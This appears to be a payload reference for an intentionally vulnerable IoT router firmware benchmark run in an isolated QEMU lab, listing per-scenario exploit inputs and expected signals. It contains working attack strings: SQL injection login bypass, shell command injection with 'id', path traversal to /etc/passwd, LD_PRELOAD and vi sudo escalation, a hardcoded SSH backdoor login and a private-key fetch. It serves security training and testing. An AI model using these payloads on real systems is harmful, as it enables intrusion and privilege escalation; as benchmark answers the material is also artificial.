# Francesco Scenario Payloads

These payloads are for the intentionally vulnerable IoTBench firmware images
only. Boot each image in an isolated QEMU lab and use the dashboard at
`http://127.0.0.1:8080` unless the row says that a guest console is required.

| Firmware id | Catalog scenario | Payload / exploit indicator | Expected signal |
| --- | --- | --- | --- |
| `router-cwe276-leaked-private-key` | Leak private key | HTTP GET `/debug/device-private.key`, or use the dashboard module default path. | The response starts with `-----BEGIN PRIVATE KEY-----`. |
| `router-cwe276-bad-chown-rights` | Bad chown rights | Dashboard input: `DNS_OVERRIDE=attacker-controlled`. | `/etc/iotbench/wan-policy.conf` is modified by the `routerweb` account. |
| `router-cwe798-ld-preload-sudo` | Bad sudo rights / LD_PRELOAD code injection | Dashboard default library `/usr/lib/iotbench/preload-marker.so`; console equivalent: `sudo -n LD_PRELOAD=/usr/lib/iotbench/preload-marker.so /usr/bin/ldpreload-target`. | `/tmp/iotbench-ldpreload-root` records execution with effective uid 0. |
| `router-cwe798-vi-privilege-escalation` | Privilege escalation using vi binary | Guest console as `routerweb`: `sudo /bin/busybox vi /tmp/iotbench-vi.txt`, then use vi shell escape if available (`:!/bin/sh`). | Passwordless sudo permits a root-run editor. |
| `router-cwe078-writable-root-cron` | Root cron on writable file | Dashboard input: `id > /tmp/iotbench-cron-root`; wait for the cron interval if cron is active in the image. | The root cron entry points to a script writable by `routerweb`; the marker file contains root `id` output when cron runs. |
| `router-cwe287-ssh-hardcoded-backdoor` | SSH server with hardcoded backdoor | Guest console or an added QEMU port forward: `ssh support@<guest-ip>` with password `iotbench`. | A hardcoded `support` account exists and is accepted by the SSH service. |
| `router-cwe089-http-sqli-auth` | Exploitable HTTP auth / SQL injection | Dashboard username `admin`, password `' OR '1'='1`. | The vulnerable query returns the `admin` role without the real password. |
| `router-cwe078-bash-command-injection` | Vulnerable Bash files / command injection | Dashboard target `127.0.0.1; id`. | Output includes `uid=995(routerweb)` after the diagnostic text. |
| `router-cwe077-c-command-injection` | Vulnerable C binaries / command injection | Dashboard target `router; id`. | Output includes `uid=995(routerweb)`. |
| `router-cwe416-use-after-free` | Use after free | Dashboard replacement object `role=admin;device=router`. | Helper prints `ACCESS GRANTED via freed object reuse`. |
| `router-cwe400-diagnostic-dos` | Denial of service | Dashboard megabytes `128` on the default 256 MB QEMU image; increase only inside disposable labs. | The helper allocates/touches attacker-selected memory or fails under memory pressure. |
| `router-cwe078-service-interface-injection` | Command injection via service interface | Dashboard probe `status; id`; guest console equivalent: `printf 'status; id\n' \| nc 127.0.0.1 9090`. | The TCP service response includes `uid=995(routerweb)`. |
| `router-cwe022-path-traversal` | Path traversal | Dashboard report `../../../../etc/passwd`. | The report viewer returns `/etc/passwd` contents instead of a report file. |

For direct API reproduction, first load `/` and read the
`meta[name="dashboard-token"]` value, then POST JSON to `/api.php` with header
`X-Dashboard-Token: <token>`. The dashboard forms already perform that step.
